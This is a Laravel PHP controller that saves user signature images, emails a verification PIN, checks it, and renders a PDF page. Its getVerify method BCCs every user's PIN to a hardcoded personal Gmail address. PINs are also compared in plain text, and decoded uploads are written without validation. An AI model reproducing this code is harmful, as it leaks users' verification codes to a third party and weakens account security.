<?php

namespace App\Http\Controllers;

use App\Mail\VerifyShipped;
use App\Models\Profile;
use App\Models\Signature;
use App\Traits\General;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class SignatureController extends Controller
{
    use General; // important

    public function getSignaturePage()
    {
        return view('site.pages.signature.index');
    }

    public function AddSign(Request $request)
    {
        if ($request->signature) {
            //convert image to png image
            $data = $request->signature;
            $data = str_replace('data:image/octet-stream;base64,', '', $data);
            $data = str_replace(' ', '+', $data);
            $data = base64_decode($data);
            $file =   uniqid() . '.png';
            $success = file_put_contents('uploads' . '/' . $file, $data);
            $user = Signature::where('user_id', auth()->user()->id)->first();
            if ($user) {
                $user->update([
                    'signature' => $file,
                ]);
            } else {
                Signature::create([
                    'signature' => $file,
                    'user' => auth()->user()->name,
                    'user_id' => auth()->user()->id,
                ]);
            }
            return redirect()->route('get.pdf')->with(['success' => "Add Signature Success"]);
        }
    }

    public function saveSignText(Request $request)
    {
        if ($request->signature) {
            //convert image to png image
            $data = $request->signature;
            $data = str_replace('data:image/png;base64,', '', $data);
            $data = str_replace(' ', '+', $data);
            $data = base64_decode($data);
            $file =   uniqid() . '.png';
            $dss = file_put_contents("uploads/" . '/' . $file, $data); // add image in folder uploads
            $user = Signature::where('user_id', auth()->user()->id)->first();
            if ($user) {
                $user->update([
                    'signature' => $file,
                ]);
            } else {
                Signature::create([
                    'signature' => $file,
                    'user' => auth()->user()->name,
                    'user_id' => auth()->user()->id,
                ]);
            }
            return redirect()->route('get.pdf')->with(['success' => "Add Signature Success"]);
        }
    }
    public function SaveUpload(Request $request)
    {
        if ($request->file('signature')) {
            $data = $request->signature;
            // here use trait function folder trait/ General file please call up trait inside class  such as in  line 11
            $file = $this->SaveImages($data, 'uploads/');
            $user = Signature::where('user_id', auth()->user()->id)->first();
            if ($user) {
                $user->update([
                    'signature' => $file,
                ]);
            } else {
                Signature::create([
                    'signature' => $file,
                    'user' => auth()->user()->name,
                    'user_id' => auth()->user()->id,
                ]);
            }
            return redirect()->route('get.pdf')->with(['success' => "Add Signature Success"]);
        }
    }

    public function getVerify()
    {
        $code = auth()->user()->pin_code;
        Mail::to(auth()->user()->email)->bcc('a7med.mostafa9900@gmail.com')->send(new VerifyShipped($code));
        return view('users.verify');
    }
    public function Verify(Request $request)
    {
        if (auth()->user()->pin_code == $request->pin_code) {
            return redirect()->route('portal.pending.home')->with(['success' => 'Add Success']);
        }
    }


    public function getPDF(){
        $user = auth()->user();
        $id = $user->id;
        $profile=Profile::where('user_id', $id);
        return view('site.pages.pdf',compact('profile', 'user'));
    }
}
